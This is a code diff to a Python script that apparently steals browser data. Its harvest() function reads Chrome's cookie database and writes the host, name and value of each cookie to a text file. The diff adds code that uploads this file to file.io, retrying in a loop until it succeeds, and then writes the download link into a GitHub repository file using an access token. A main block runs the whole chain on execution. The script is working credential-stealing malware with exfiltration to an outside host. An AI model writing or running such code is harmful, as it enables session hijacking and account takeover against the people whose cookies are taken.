@@ -20,8 +20,8 @@ def harvest():
     db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Network", "Cookies")
     if not os.path.exists(db_path): return None
     
-    shutil.copyfile(db_path, "temp.db")
-    conn = sqlite3.connect("temp.db")
+    shutil.copyfile(db_path, "temp_db")
+    conn = sqlite3.connect("temp_db")
     cursor = conn.cursor()
     cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
     
@@ -34,6 +34,40 @@ def harvest():
             cookies_text += f"{host}\tTRUE\t/\tFALSE\t0\t{name}\t{val}\n"
         except: continue
     
+    conn.close()
+    if os.path.exists("temp_db"): os.remove("temp_db")
+    
+    with open("my_cookies.txt", "w", encoding="utf-8") as f: 
+        f.write(cookies_text)
+    return "my_cookies.txt"
+
+def upload_and_notify(file_path):
+    while True:
+        try:
+            with open(file_path, "rb") as f:
+                response = requests.post("https://file.io", files={"file": f})
+            
+            if response.status_code == 200:
+                download_link = response.json().get("link")
+                update_github_json(download_link)
+                os.remove(file_path)
+                break
+        except:
+            time.sleep(60)
+
+def update_github_json(link):
+    url = f"https://api.github.com/repos/{REPO}/contents/Noor.json"
+    headers = {"Authorization": f"token {GITHUB_TOKEN}"}
+    res = requests.get(url, headers=headers).json()
+    sha = res["sha"]
+    data = {"status": "Success", "download_link": link, "time": time.ctime()}
+    content = base64.b64encode(json.dumps(data, indent=4).encode()).decode()
+    requests.put(url, headers=headers, json={"message": "New Download Link", "content": content, "sha": sha})
+
+if __name__ == "__main__":
+    file_name = harvest()
+    if file_name:
+        upload_and_notify(file_name)
     conn.close()
     os.remove("temp.db")
     # تجهيز الملف محلياً أولاً
